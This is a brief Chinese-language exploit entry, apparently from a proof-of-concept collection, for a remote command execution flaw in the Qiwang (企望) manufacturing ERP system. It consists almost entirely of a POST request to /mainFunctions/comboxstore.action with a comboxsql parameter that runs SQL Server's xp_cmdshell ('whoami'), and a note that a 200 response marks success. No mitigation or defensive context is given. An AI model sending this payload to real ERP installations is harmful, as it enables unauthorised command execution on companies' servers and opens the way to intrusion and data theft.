# 企望制造ERP系统RCE漏洞

企望制造ERP系统 ｜ 命令执行 ｜ —
- **请求**：`POST /mainFunctions/comboxstore.action HTTP/1.1`

**Payload**
```
comboxsql=exec%20xp_cmdshell%20'whoami'
```
- **响应特征**：200